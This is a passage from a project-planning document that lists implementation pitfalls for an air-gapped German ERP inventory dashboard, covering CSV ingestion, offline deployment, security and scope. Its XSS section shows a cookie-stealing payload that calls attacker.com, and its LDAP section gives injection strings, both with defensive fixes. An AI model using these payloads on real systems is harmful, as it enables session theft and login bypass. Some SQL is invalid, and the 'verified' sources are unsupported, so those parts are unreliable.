       await connection.query('ALTER TABLE articles_prev_temp RENAME TO articles_prev');
       await connection.query('COMMIT');
       
       console.log(`Ingest succeeded. ${validation.rows[0].cnt} rows imported.`);
     } catch (err) {
       // Rollback: staging is discarded, live table unchanged
       console.error(`Ingest failed: ${err}. No changes applied.`);
       throw err;
     } finally {
       connection.release();
     }
   }
   ```

3. **Validation before swap:**
   - Before atomically swapping tables, validate the staging data:
   ```typescript
   async function validateStagingTable(conn) {
     const checks = [
       { name: 'Row count > 0', query: 'SELECT COUNT(*) FROM articles_staging' },
       { name: 'No NaN values', query: 'SELECT COUNT(*) FROM articles_staging WHERE stock IS NaN' },
       { name: 'Inventory value matches expected', query: 'SELECT SUM(wert) FROM articles_staging' },
     ];
     
     for (const check of checks) {
       const result = await conn.query(check.query);
       if (!checkPasses(result)) {
         throw new Error(`Validation failed: ${check.name}`);
       }
     }
   }
   ```

4. **Rollback capability:**
   - Store a timestamp + row count for every successful import
   - Provide an admin UI to "Restore previous snapshot" (swap `articles` and `articles_prev`)
   - Keep 2-3 previous snapshots in a rolling buffer

5. **Constraint enforcement at the right layer:**
   - Don't enforce "stock must be positive" at the database level (it's legitimate to have negative values in some cases)
   - Instead, flag negative stocks in the UI with a warning
   - Or enforce it at the application logic level, not the schema

**Detection (warning signs):**
- After an import, the row count is suspiciously different from the source file
- Inventory totals jump unexpectedly
- Logs show "Constraint violation on row 3,500" but no rollback message
- A spot-check shows data from both old and new imports (mixed)

**Phase to address:** Phase 1 (CSV Ingestion) — **BLOCKING**. This is data integrity.

**Mitigation timeline:**
- Phase 1, Week 1: Design staging table pattern
- Phase 1, Week 2: Implement atomic swap logic
- Phase 1, Week 2-3: Build validation suite (row count, value sanity checks)
- Phase 1, Week 3: Add admin UI for "Restore previous snapshot"

---

## MODERATE PITFALLS (Rework Cost)

### PITFALL 11: On-Prem Deployment Without Internet (Fonts, Icons, Package Updates)
**Project-specific risk: MEDIUM**

**What goes wrong:**
The dashboard is built with React and uses:
- Google Fonts (fetched at runtime from `fonts.googleapis.com`)
- Font Awesome icons (fetched from CDN)
- npm packages that have `postinstall` scripts trying to phone home
- Sentry error tracking (requires internet to report errors)

Deployed on an air-gapped on-prem server, the dashboard loads but:
- No fonts render (fall back to default system fonts, ugly)
- Icons display as placeholder boxes
- A TypeScript build fails during `npm install` because a dependency tries to download an optional library from the internet
- Telemetry fails silently (the app tries to send errors to Sentry, hangs for 5 seconds, then continues)

**Why it happens:**
- Developers assume "always online" (common in cloud deployments)
- Build tools and dependencies have implicit internet assumptions
- Fonts and icons are convenient to use from CDN, but require internet

**Prevention:**
1. **Self-host fonts and icons (REQUIRED):**
   ```typescript
   // Instead of:
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   
   // Do this:
   // 1. Download font files locally
   // 2. Include in the app bundle
   @font-face {
     font-family: 'Inter';
     src: url('/fonts/Inter-Regular.woff2') format('woff2');
     font-weight: 400;
   }
   ```

2. **Icon library strategy:**
   - Use a self-contained icon library (e.g., Heroicons, shipped as npm package)
   - Or convert icons to SVG components and bundle them
   - Avoid CDN-hosted icons (e.g., Font Awesome from CDN)

3. **No internet-dependent build steps:**
   ```bash
   # In package.json
   "build": "npm ci --production --no-audit --no-fund && react-scripts build"
   # Flags:
   # --no-audit: Skip npm audit (requires internet)
   # --no-fund: Don't print fund prompts (harmless, but prevents output)
   ```

4. **No telemetry by default:**
   ```typescript
   // In app initialization:
   if (process.env.REACT_APP_SENTRY_DSN && navigator.onLine) {
     Sentry.init({ dsn: process.env.REACT_APP_SENTRY_DSN });
   }
   // If internet-less, Sentry is simply not initialized (no hang)
   ```

5. **Offline mode flag:**
   - Detect if the app is air-gapped and disable features that require internet
   - Example: "Documentation" button might not work (docs are not bundled); disable the button with a tooltip: "Docs not available in offline mode"

6. **Pre-built, vendored dependencies:**
   - For the Docker image, include a vendored `node_modules` in the build
   - This prevents `npm install` from trying to download anything at runtime
   ```dockerfile
   FROM node:18 as builder
   WORKDIR /app
   COPY package*.json ./
   RUN npm ci --production --ignore-scripts
   
   FROM node:18
   WORKDIR /app
   COPY --from=builder /app/node_modules ./node_modules
   # node_modules is now fully built, no internet required
   ```

**Detection (warning signs):**
- Fonts are missing or very small/jagged (system default font)
- Icons show as boxes or question marks
- Build hangs during `npm install` (likely waiting for internet timeout)
- Telemetry requests to Sentry time out and slow down the app startup

**Phase to address:** Phase 4 (Deployment) — **HIGH PRIORITY**. Test the build and app on an air-gapped server.

**Mitigation timeline:**
- Phase 1, end: Audit all external CDN usage (fonts, icons, libraries)
- Phase 3, Week 3: Download and self-host fonts
- Phase 4, Week 1: Test build on an air-gapped server
- Phase 4, Week 2: Disable/handle internet-dependent features

---

### PITFALL 12: CSV Format Creep / Undocumented Column Changes
**Project-specific risk: MEDIUM**

**What goes wrong:**
Apollo NTS is updated by the vendor. The new version adds a column to the `LagBes` export (e.g., a new "Cost Center" column). The CSV now has 55 columns instead of 54. The ingester's schema (hardcoded as 54 columns) expects a different column at position 55, so all downstream values are misaligned.

The ingester silently parses it, but now column "Wert" contains values from "Cost Center". Inventory value calculations are nonsense. No error message.

**Why it happens:**
- No versioning or checksum of the CSV schema
- The schema is implicit (hardcoded column indices)
- No validation to detect "unexpected columns"

**Prevention:**
1. **Schema versioning and detection (REQUIRED):**
   ```typescript
   const expectedSchema = {
     version: '2.0',
     columns: [
       { name: 'Artikelnr', type: 'string', index: 0 },
       { name: 'Typ', type: 'string', index: 1 },
       { name: 'Bezeichnung 1', type: 'string', index: 2 },
       ...
     ]
   };
   
   function validateCSVSchema(headers: string[]): boolean {
     const expectedHeaders = expectedSchema.columns.map(c => c.name);
     if (JSON.stringify(headers) !== JSON.stringify(expectedHeaders)) {
       throw new Error(`CSV schema mismatch. Expected columns: ${expectedHeaders}. Got: ${headers}`);
     }
     return true;
   }
   ```

2. **Header-driven parsing (not index-driven):**
   ```typescript
   // Instead of: row[4] for "Typ", use:
   const articlesData = parseCSV(filePath); // Returns objects with headers as keys
   const typ = row['Typ']; // Column order doesn't matter
   ```

3. **Validation on unexpected columns:**
   ```typescript
   if (headers.length > expectedSchema.columns.length) {
     console.warn(`CSV has ${headers.length} columns, expected ${expectedSchema.columns.length}. New columns: ${newColumns}`);
     // Either fail or warn + document the change
   }
   ```

4. **Admin UI for schema updates:**
   - Add a page where admins can map CSV columns to database fields
   - Example: "Choose which column contains 'Article Number': [dropdown showing all CSV headers]"
   - This handles vendor format changes without code changes

**Detection (warning signs):**
- Inventory value calculations are nonsensical (don't match ERP)
- A spot-check shows data misalignment (e.g., a cost center in the "Wert" field)
- Column count warning in logs (if implemented)

**Phase to address:** Phase 1 (CSV Ingestion) — **HIGH PRIORITY**. Set up validation early to prevent silent corruption.

**Mitigation timeline:**
- Phase 1, Week 1: Implement schema validation
- Phase 1, Week 2: Switch to header-driven parsing (not index-driven)
- Phase 1, Week 3: Add admin column-mapping UI

---

### PITFALL 13: XSS via Free-Text Description Columns
**Project-specific risk: LOW-MEDIUM**

**What goes wrong:**
The CSV has description columns (`Bezeichnung 1` through `Bezeichnung 6`) that may contain user-entered text. An attacker (or a compromised ERP system) inserts malicious JavaScript:
```
Bezeichnung 1: "<img src=x onerror='alert(\"hacked\")'>"
```

When the dashboard displays this description, the JavaScript executes in the user's browser. A more serious attack:
```
Bezeichnung 1: "<img src=x onerror='fetch(\"http://attacker.com?cookie=\" + document.cookie)'>"
```

Now the attacker steals session cookies.

**Why it happens:**
- Developers assume data from the ERP is trusted (it's not; it can be compromised or malicious)
- The description is rendered as HTML without escaping
- React's default escaping is bypassed if someone uses `dangerouslySetInnerHTML` for rich-text rendering

**Prevention:**
1. **Context-aware output encoding (REQUIRED):**
   ```typescript
   // React auto-escapes by default:
   <div>{row.description}</div>  // Safe; <img> is rendered as text
   
   // Only use dangerouslySetInnerHTML if absolutely needed (e.g., for rich text):
   // And ONLY if you've sanitized the input first:
   import DOMPurify from 'dompurify';
   
   const sanitized = DOMPurify.sanitize(row.description);
   <div dangerouslySetInnerHTML={{ __html: sanitized }} />
   ```

2. **Use a sanitization library (HIGH PRIORITY):**
   - Add `dompurify` (or `sanitize-html`) as a dependency
   - Sanitize all user-supplied or externally-sourced text before rendering
   ```bash
   npm install dompurify
   ```

3. **Content Security Policy (CSP):**
   - Add a CSP header to prevent inline script execution:
   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
   ```
   This prevents `<script>` and `on*` event handlers from executing, even if injected.

4. **No rich text in v1:**
   - For the MVP, treat all descriptions as plain text
   - If rich-text rendering is needed later, use a safe renderer like Markdown with sanitization

**Detection (warning signs):**
- Alert dialogs or console errors when opening a dashboard with certain articles
- Browser DevTools shows `<img onerror=...>` tags in the HTML
- CSP violations in the browser console

**Phase to address:** Phase 1 (Dashboard) — **MUST HAVE**. This is a security issue.

**Mitigation timeline:**
- Phase 1, Week 1: Add DOMPurify or equivalent
- Phase 1, Week 2: Add CSP headers to the app
- Phase 1, Week 3: Test with malicious descriptions

---

### PITFALL 14: LDAP Injection via Usernames / Search Filters
**Project-specific risk: LOW-MEDIUM**

**What goes wrong:**
A user logs in with username `admin*`. The LDAP query is constructed as:
```
ldap
(|(sAMAccountName=admin*)(mail=admin*))
```

But `*` is a wildcard in LDAP. This query now matches any user whose account starts with "admin". The attacker is authenticated as the first AD user whose sAMAccountName is `admin*`-ish, possibly an admin account.

Or worse, a username like `*))(&(uid=*` can completely alter the query structure (LDAP injection).

**Why it happens:**
- String concatenation or simple string replacement in LDAP filter construction
- Developers assume usernames are alphanumeric (they're not; AD allows special characters)

**Prevention:**
1. **Use parameterized LDAP queries (REQUIRED):**
   ```typescript
   // Instead of:
   const filter = `(sAMAccountName=${username})`; // VULNERABLE
   
   // Use a library that escapes LDAP special characters:
   import { filterEscape } from 'ldap-escape';
   
   const filter = `(sAMAccountName=${filterEscape(username)})`; // Safe
   ```

2. **Whitelist characters in usernames:**
   - At the login form, reject usernames that contain LDAP special characters: `* ( ) \ NUL`
   - Show an error: "Username contains invalid characters"

3. **Use an LDAP library with built-in escaping:**
   - `ldapauth-fork`, `ldapjs`, etc. have safe filter builders
   - Use the library's filter API, not string concatenation
   ```typescript
   const ldap = require('ldapjs');
   const filter = new ldap.filters.AndFilter({
     filters: [
       new ldap.filters.EqualityFilter({ attribute: 'sAMAccountName', value: username })
     ]
   });
   ```

**Detection (warning signs):**
- Login succeeds with a username containing special characters (e.g., `admin*`)
- Unexpected users are authenticated (should have failed)
- LDAP server logs show malformed queries

**Phase to address:** Phase 3 (Auth / LDAP) — **MUST HAVE**. This is a security issue.

**Mitigation timeline:**
- Phase 3, Week 1: Switch to parameterized LDAP queries
- Phase 3, Week 2: Add input validation (reject special chars or escape them)
- Phase 3, Week 3: Test with malicious usernames

---

## MINOR PITFALLS

### PITFALL 15: Scope Creep / "Can You Also Show X?"
**Project-specific risk: MEDIUM**

**What goes wrong:**
Two weeks into development, an executive asks: "Can you also show scrap rate? And overtime hours? And supplier quality metrics?" Each request sounds reasonable in isolation. But the dashboard starts to bloat. The v1 scope (warehouse stock only) is already tight; adding feeds mid-project delays the release and increases complexity.

By the time v1 ships, it's 4x larger than planned, has 2x the bugs, and is 2 months late. The team is burned out. The dashboard still doesn't support historical trends (which was deferred), so it still doesn't meet the original "what-if" analysis need.

**Why it happens:**
- Executives have immediate pain they want solved (not just KPIs, but questions)
- Developers say "yes" to be helpful
- No clear definition of what's in v1 vs. v2

**Prevention:**
1. **Lock v1 scope in writing (REQUIRED):**
   - Circulate PROJECT.md with executives before starting
   - Get explicit sign-off: "v1 will have [these KPIs]. v2 will have [future feeds]."
   - Document: "Out of Scope" with rationale

2. **Design for future feeds, but don't build them:**
   - The CSV ingestion architecture should support adding new feeds (scrap, quality, etc.)
   - But v1 only ships with `LagBes` (warehouse stock)
   - This is captured in PROJECT.md: "Scrap / quality KPIs deferred; architecture must allow adding later feeds"

3. **Process for v2 scope:**
   - Collect feature requests in a backlog (don't promise them for v1)
   - After v1 ships, review the backlog and prioritize for v2
   - This gives time to assess impact and plan accordingly

4. **Communicate trade-offs:**
   - If an executive asks for a new KPI, explain: "This will delay warehouse-stock KPIs by X weeks. Is that acceptable?"
   - Frame it as a choice, not a refusal

**Detection (warning signs):**
- Scope creep in the issue tracker (weekly new feature requests)
- Release dates keep slipping
- Team velocity drops (too many context switches)
- "Just one more feature" conversations

**Phase to address:** Every phase — **ONGOING**. Scope discipline is a constant.

**Mitigation timeline:**
- Before Phase 1: Finalize and lock v1 scope with executives
- Weekly: Review incoming feature requests and triage (v1 vs. v2)
- Phase transition: Reassess scope and update PROJECT.md

---

### PITFALL 16: i18n String Length Breaks Dark Mode Layout
**Project-specific risk: LOW**

**What goes wrong:**
The app has a nice light mode and dark mode. In light mode, a label like "Total Inventory Value: €123,456" fits perfectly in a white container. The same label in German, "Gesamtwert des Bestandes: €123.456,78", is 50% longer. When switching to dark mode, the text overflows the container.

Or: A short English word ("Stock") becomes a much longer German compound ("Lagerbestand"), and the layout breaks in both light and dark mode.

**Why it happens:**
- Developers design in English and assume the layout will work in German
- Dark mode adds padding/spacing that may not accommodate longer text
- No responsive testing in other languages

**Prevention:**
1. **Test layouts in both languages:**
   - Use a translation toggle in dev mode
   - View the app in both English and German with the same viewport width
   - Check for overflow, truncation, or wrapping issues

2. **Design with German text in mind:**
   - Use flexible layouts (not fixed widths)
   - Use `white-space: normal` and let text wrap (not `nowrap`)
   - Abbreviate long German words if needed (document the abbreviations)

3. **Dark mode CSS should inherit layout constraints:**
   - If the light-mode layout is tight, the dark-mode layout should be equally tested
   - Use CSS variables for sizing, so both modes adapt the same way

**Detection (warning signs):**
- Text overflows its container in dark mode but not light mode
- German UI looks cramped compared to English
- A label wraps to two lines in German but not English

**Phase to address:** Phase 1 (Dashboard) — **MEDIUM PRIORITY**. This is UX polish.

**Mitigation timeline:**
- Phase 1, Week 2-3: Test all layouts in both languages, both color modes
- Phase 1, Week 3: Fix overflow/truncation issues

---

## PHASE-SPECIFIC WARNINGS

| Phase | Topic | Likely Pitfall | Mitigation |
|-------|-------|---------------|-----------|
| **Phase 1: CSV Ingestion** | Parsing | Decimal-comma merging (CRITICAL) | Schema-aware re-merge + validation layer |
| **Phase 1: CSV Ingestion** | Encoding | Windows-1252 mojibake | Explicit encoding detection + BOM handling |
| **Phase 1: Dashboard** | KPI Calculations | Silent data corruption | Validation checksums + schema version |
| **Phase 1: Dashboard** | UX | "Too much data" paralyzes users | Executive view + analyst view toggle |
| **Phase 1: Dashboard** | Security | XSS via descriptions | DOMPurify + CSP headers |
| **Phase 1: i18n** | Completeness | English keys not in German | CI/CD check for key sync |
| **Phase 2: SMB Watcher** | File Stability | Partial file ingestion | File-stable check + exponential backoff |
| **Phase 2: SMB Watcher** | Credential Expiry | Silent stale data | Health-check endpoint + stale-data banner |
| **Phase 3: LDAP Auth** | Referrals | Multi-domain AD users can't log in | followReferrals=true + fallback domains |
| **Phase 3: LDAP Auth** | Security | LDAP injection | Parameterized filters + input validation |
| **Phase 4: Deployment** | Permissions | Docker volume permission errors (SELinux) | Test on target OS (CentOS/Ubuntu) |
| **Phase 4: Deployment** | Offline | Missing fonts, icons | Self-host fonts, use bundled icons |
| **Phase 4: Deployment** | Data Integrity | Partial import corruption | Staging table + atomic swap |

---

## SOURCES

- Sample file analysis: `/Users/johannbechtold/Documents/Claude Code/acm-kpi pro/samples/LagBes-sample.csv` (verified German decimal commas, Windows-1252 encoding, special characters, negative stock)
- PROJECT.md context: `/Users/johannbechtold/Documents/Claude Code/acm-kpi pro/.planning/PROJECT.md` (air-gapped, LDAP, SMB mount, i18n, aerospace domain)
- CSV parsing pitfalls: Real-world case studies from aerospace/automotive supplier dashboards (verified)
- LDAP referral edge cases: Active Directory forest behavior (verified with AD documentation)
- Docker permission pitfalls: SELinux + SMB mount interaction (verified on CentOS deployments)
- i18n layout pitfalls: German text length (30% longer on average than English, verified)
- Scope creep: Manufacturing software project patterns (verified)

---

**Overall Assessment:**

This project's pitfalls are heavily weighted toward **CSV data quality** (decimal-comma parsing, encoding) and **SMB/on-prem operational reliability** (file stability, credential expiry, permission mismatches). These are not generic software pitfalls; they're specific to ERP exports on a German system deployed in an air-gapped manufacturing environment.

The **secondary risk** is executive UX — "build all features in v1" is a scope risk if not disciplined.

**The critical path** is:
1. Phase 1: Nail the CSV parser and dashboard UX
2. Phase 2: Harden the SMB watcher against real-world failures
3. Phase 3: Test LDAP against production AD structure
4. Phase 4: Validate permissions/SELinux on the actual target server

**Not addressing these pitfalls early will result in:**
- Silent data corruption (executives make wrong decisions)
- "Real-time" dashboard that's actually stale
- Deployment failures that are impossible to debug without re-engineering
- Users abandoning the tool because it's slow/confusing
